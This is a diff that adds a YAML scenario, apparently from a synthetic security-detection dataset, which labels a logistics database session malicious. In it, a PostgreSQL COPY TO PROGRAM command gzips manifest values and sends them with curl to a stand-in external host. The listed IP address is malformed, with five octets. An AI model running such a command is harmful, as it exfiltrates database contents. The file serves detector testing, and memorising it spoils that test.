@@ -1,0 +1,30 @@
+scenario_id: gen_logistics_16_copy_to_program_mal_385m
+family_id: gen_logistics_16_copy_to_program_fam_385
+domain: logistics
+time_of_day: '23:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT declared_value FROM manifests) TO PROGRAM 'gzip | curl -sX POST
+      https://analytics-mirror.datasink.example/ingest --data-binary @-'
+    connects_to:
+      ip: 141.98.11.6.188
+      port: 443
+matched_pair_id: gen_logistics_16_copy_to_program_pair_385
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
